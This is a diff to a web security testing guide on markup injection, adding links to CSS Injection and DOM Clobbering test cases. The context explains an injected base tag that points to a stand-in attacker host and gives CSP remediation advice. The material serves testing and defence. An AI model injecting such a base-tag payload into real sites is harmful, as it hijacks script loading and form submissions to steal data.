@@ -89,6 +89,11 @@ Chromium-based browsers block resource URLs that contain both a raw newline and 
 
 An injected `<base href="https://attacker.example/">` changes how every relative URL after it is resolved. Relative script sources, form actions and links then point to the attacker's server. With a nonce-based CSP, an existing script tag that carries a valid nonce and a relative `src` loads from the attacker's server and runs, which turns markup injection into script execution. Check whether the page loads scripts or submits forms with relative URLs after the injection point, and whether the CSP sets `base-uri`.
 
+## Related Test Cases
+
+- [CSS Injection](05-CSS_Injection.md): exfiltrating data with styles when scripts are blocked.
+- [DOM Clobbering](16-DOM_Clobbering.md): using injected `id` and `name` attributes to change how existing scripts behave.
+
 ## Remediation
 
 Encode user input for the HTML context it is written into, so that it can't open new tags or attributes. Set `base-uri 'none'` or `'self'` and a restrictive `form-action` in the Content Security Policy, and keep sensitive values such as CSRF tokens out of pages that also reflect user input where possible.
